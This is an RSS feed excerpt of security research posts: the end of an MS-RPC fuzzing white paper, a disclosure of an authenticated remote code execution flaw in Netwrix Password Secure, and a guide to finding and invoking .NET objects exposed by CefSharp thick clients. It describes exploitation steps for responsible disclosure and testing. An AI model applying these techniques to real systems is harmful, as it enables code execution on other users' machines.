Process Monitor does the job.This White paper describes how to automate MS-RPC vulnerability research using a fuzzing approach. This led to the discovery of multiple vulnerabilities within Windows, which proves that the approach is effective. In conclusion, this research demonstrates that the fuzzing approach bridges a gap in current tooling by providing an automated solution for analyzing and testing MS-RPC services.The fuzzer still lacks support for more advanced fuzzing, specifically where procedures depend on each other. Currently, the fuzzer is effective in finding crashes and coerce vulnerabilities that rely on calling only one procedure. Future work includes better endpoint support, better error handling, ACL support, support for time out, support for procedure path finding (call procedure 1 before calling procedure 2 with procedure’s 1 output parameter).]]></content:encoded></item><item><title>Authenticated Remote Code Execution in Netwrix Password Secure (CVE-2025-26817)</title><link>https://www.8com.de/cyber-security-blog/authenticated-remote-code-execution-in-netwrix-password-secure-cve-2025-26817</link><author>/u/k8pf</author><category>netsec</category><pubDate>Thu, 22 May 2025 08:09:13 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Password managers are considered one of the most secure ways to keep passwords safe. We have analyzed the commercial password manager by  and discovered an authenticated Remote Code Execution vulnerability. is an enterprise password manager, which covers a variety of functions that go beyond the normal password protection. One of these features allows to securely share passwords, keys and secrets with other users.This blog post describes how we found a way to use this functionality to execute code on other users’ systems.The security check was performed for the following version:Netwrix Password Secure (Client - PSC) 9.2.0.32454Netwrix Password Secure (Server - PSS) 9.2.0.32454Versions up to 9.2.2 are affected by the vulnerability.The password manager’s functionality to share passwords with other users or teams makes the application very interesting for potential vulnerabilities. During the analysis, we looked for classic process calls like . One method stood out in particular.The class  implements a method called , which creates a new  objects. So it could be that documents, or better said files, are always executed with the default program based on the file extension.The method is called by the  method in the  class.For example, if it was possible to upload executable binaries such as  files, these should be executed via the Explorer.So the first goal was to find out where documents could be uploaded. In the password manager, I noticed that there is also a  tab besides the  tab.There it was possible to upload PDF files and make them available to other users as a link via the share function. Unfortunately, when uploading  files as a document link, a message appears that this type of file is not allowed. Upon further investigation, it was discovered that when a document is uploaded, the application checks the file extension to verify the file type.Multiple file extensions are whitelisted by default:This prevents the upload of  files as new document shortcuts. After further analysis, it was discovered that there are differences between modifying an existing shortcut and the initial upload. The application stores the file path with the file extension in the  attribute. In addition, the attribute  is used, which only contains the file extension.When changing a document link that has already been uploaded, only the modified attributes are changed. Then the VerifyCorrectDocumentType method is called again to check the file extension against the whitelist. However, an important detail has been overlooked.Only the  attribute is checked in the VerifyCorrectDocumentType method. After that, no further checks are performed on the file type and file path, and the change is simply applied.So if only the file path is changed for an existing document link, only the  attribute is affected. The  attribute remains unchanged. This allows changing the file path of an existing document link to an  file without causing the  attribute check to fail.Since no executables can be uploaded due to whitelisted restrictions, there are two possible attack scenarios:Change the file path to a custom executable file located on a network share that is accessible to the userChange the file path to one of the standard Windows executable files that are always presentSince the scenario without network sharing is a more realistic scenario, the path could be set to . However, the next issue would be that the  is executed, but no payload can be dropped to run its own code.Those who have been paying attention will have noticed something. There is already one attribute that can help. There is an additional attribute .Sounds like a way to pass parameters to the executing program. The attribute is also inherited by the container object without any further checks. When  is called, the  attribute is always specified as well. It was also noticed that in the newly created  object, the  is not used as an extension, although it is stored separately. In fact, the extension is extracted from the current file path that we are trying to change and used for this purpose. This means that it is likely that the correct default program will be started. In our case, that would be , which should run the  with our specified payload.So it might be possible to inject a payload for the  by configuring this parameter on the client side. Now it is time to move from theory to practice.First, the Netwrix Password Secure Client application was started in a debugger and a new document link was created.After that, a harmless PDF file such as the Edge browser manual () is uploaded.In the debugger, a breakpoint is then set in the PsrClientLayer.Models.DocumentsAddModel class in the  method (line 317) to modify the  attribute later.The document link will then be saved.On saving, the breakpoint is triggered and in the  the value of  is set to .Before the client sends the object to the server, the payload  is added to  for demonstration purposes. If this works, the Windows Calculator should pop up when the vulnerability is successfully exploited.When the debugger resumes, a message will pop up, that the entry has been saved.After that, the properties of the document shortcut can be opened again by right-clicking on the entry.Now it’s time to specify the local path to the .The shortcut can then be saved with the changed path.The change was successful. The entry now shows the new modified path to , because only the specified file type was checked, not the modified file path.The document link has now been manipulated so that the file extension is . However, when clicking on the entry, the default program for the specified file in the file path should be called () and not the specified file extension in the  object (). In addition, the payload  has been injected into the  attribute to popup the calculator when the document link is opened with a double-click.Now the shortcut can be shared with other users.When this user opens the shortcut, we can observe the following: Clicking on it opens the  window, followed by the executed payload, which pops the calculator.The path actually worked to execute custom code when a user opened the shared document link. Of course, this vulnerability is only authenticated and exploitable with user interaction. However, there is another scenario resulting from the vulnerability found. The same attack can be performed on documents that have been shared with the attacker user itself, if he has permission to modify the file path property of the shared document link.Another feature even allows direct usage via a desktop shortcut that can be created for the entry. So the user can not even see the file path via the shortcut.The vulnerability has been fixed in all Netwrix Password Secure versions above 9.2.2.28.01.2025 - 8com contacted Netwrix PSIRT Product Security28.01.2025 - Netwrix asked for Proof of Concept29.01.2025 - 8com sent Proof of Concept to Netwrix PSIRT11.02.2025 - Netwrix confirmed the vulnerability and requested CVE number27.03.2025 - 8com adjusted disclosure timeline in coordination with Netwrix01.04.2025 - Netwrix Advisory has been published22.05.2025 - Date of disclosure]]></content:encoded></item><item><title>How to Enumerate and Exploit CefSharp Thick Clients Using CefEnum</title><link>https://blog.darkforge.io/cef/cefsharp/cefenum/thick-client/.net/2025/05/21/CefSharp-Enumeration-With-CefEnum.html</link><author>/u/Moopanger</author><category>netsec</category><pubDate>Thu, 22 May 2025 07:23:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[CefSharp is widely embedded in .NET-based Thick-Clients, often without proper hardening or awareness of its security implications. For researchers and red teamers, this creates opportunities for stealthy exploitation, persistence, and even RCE if misconfigurations are identified.In this post, we explore common misconfigurations and attack vectors encountered during testing. We’re also releasing a new enumeration tool to help you quickly identify and fingerprint CefSharp instances in your engagements.Before we discuss CefSharp, let’s look at CEF (Chromium Embedded Framework).Chromium Embedded Framework (CEF). A simple framework for embedding Chromium-based browsers in other applications.
+CEF is a BSD-licensed open source project founded by Marshall Greenblatt in 2008 and based on the Google Chromium project. Unlike the Chromium project itself, which focuses mainly on Google Chrome application development, CEF focuses on facilitating embedded browser use cases in third-party applications. CEF insulates the user from the underlying Chromium and Blink code complexity by offering production-quality stable APIs, release branches tracking specific Chromium releases, and binary distributions.CefSharp lets you embed Chromium in .NET apps. It is a lightweight .NET wrapper around the Chromium Embedded Framework (CEF) by Marshall A. Greenblatt. About 30% of the bindings are written in C++/CLI with the majority of code here is C#. It can be used from C# or VB, or any other CLR language. CefSharp provides both WPF and WinForms web browser control implementations.Much like Electron, CefSharp enables developers to build desktop applications using web technologies, tailored specifically for the Windows and .NET ecosystem. Its real power lies in its ability to expose internal .NET objects to client-side JavaScript, creating a bidirectional bridge between the client frontend and the user’s system.This architecture can allow web pages to interact with privileged system functions, something that, when misconfigured, becomes a valuable entry point for security researchers. It can lead to file access, method invocation, or even command execution directly from the browser context.Finding client-side vulnerabilities like XSS in a Thick-Client may seem unconventional, especially since users don’t interact with the app like a typical browser. But as we’ve seen repeatedly with Electron-based apps, these flaws can lead to severe consequences—and CefSharp is no different. When XSS is combined with CefSharp’s JavaScript bridge to exposed .NET objects, a persistent XSS can quickly escalate into RCE.Before crafting any payloads, though, you need to understand which objects are exposed to the client/browser front-end via CefSharp.Finding Exposed Objects, With Access To The Client Source CodeThis is straightforward. According to the CefSharp wiki, there are two methods to register your object with browser.JavascriptObjectRepository. In both examples below, the exposed object is named , referencing the  class. (Note: bindable object names will generally follow camelCase, not PascalCase.)From here you simply locate the “BoundObject” class, and inspect what methods are available.If a CefSharp client retrieves a malicious page, that page can bind to the exposed object and invoke its methods directly. We’ve created a vulnerable test application called BadBrowser for you to try this out yourself:In the code below, we use CefSharp.BindObjectAsync("customObject") to bind to  and execute the  method with window.customObject.WriteFile("test.txt").Now, when we view a page containing the above JavaScript in BadBrowser, a file named test.txt is written to .Delivering the Payload (Getting the Client to Load Your Page)If you’ve discovered a persistent XSS vulnerability in the client’s portal, you can embed your payload into the page, launch the client, and trigger the XSS as it renders.If direct navigation is restricted and custom URLs can’t be entered, there’s a common workaround: drag a link to your test page from another browser and drop it into the client window.Finding Exposed Objects, without access to the source codeIf you’re testing a client without access to its source code, you can use CefEnum. This simple tool helps detect CefSharp-based clients and identify .NET objects exposed to JavaScript.When you launch CefEnum, it starts an HTTP listener on port 9090 (configurable via the -port flag). Upon a client connection, CefEnum first delivers a wordlist to the client, which is stored in the front-end. These words are then used to fuzz and guess exposed object names. The tool includes a default wordlist based on PortSwigger’s param-miner.After that, CefEnum checks whether the connecting client is running CefSharp.You can interact directly with the client from the command line. CefEnum will pass messages to the clients over a WebSocket. You can either type JavaScript directly into the console, or use the built-in helper functions to do the work for you.This is the core feature of CefEnum: it attempts to bind to every object name in the wordlist. For each entry, the page executes CefSharp.BindObjectAsync("ObjectName") and checks whether the binding was successful using CefSharp.IsObjectCached(ObjectName). This process runs at roughly 2,000 attempts per second, and you can expand it by supplying a larger wordlist.CefEnum also supports common suffixes, which are automatically appended to each wordlist entry and tested as well. These suffixes include:You can use your own wordlist by specifying it at startup with the  flag.You can also brute-force object names with the  command [a-zA-Z] This uses the same detection method as , but it’s not recommended as performance drops off quickly, and the process becomes impractical beyond five-character names.Once you’ve discovered an object, use the  command to instruct the client to enumerate all available methods/functions via introspection:You can also conduct all these attacks from within the client/browser itself if your page is rendered within the client.Interact with the bindingOnce you’ve identified an object and successfully enumerated its methods, you can invoke them using:Just replace objectName and methodName with the appropriate values. As seen for BadBrowser’s  with the WriteFile() method:If your portal is not intended to load content from external domains, implement a strict allowlist of trusted origins. Deny any requests attempting to load resources from outside this list. (Note: This might sound like configuring the CSP, but this list must be enforced within the client’s C# code, not the web server.)This, however, won’t prevent all attacks. For example, if the portal hosting the backend site contains XSS vulnerabilities, attackers can simply embed their attack payload into the portal itself.Carefully review the classes you expose to the browser and ensure that only those with minimal, tightly scoped methods are bound.If you’re unsure or would like a second opinion, book a session with us at DarkForge Labs, we’d be happy to help.CefSharp is an excellent project, maintained by a great community. It remains a popular choice for enterprises developing in-house thick-clients.If there’s a faster or more effective way to enumerate object names that we’ve missed, feel free to submit a PR. Thanks for reading!]]></content:encoded></item></channel></rss>
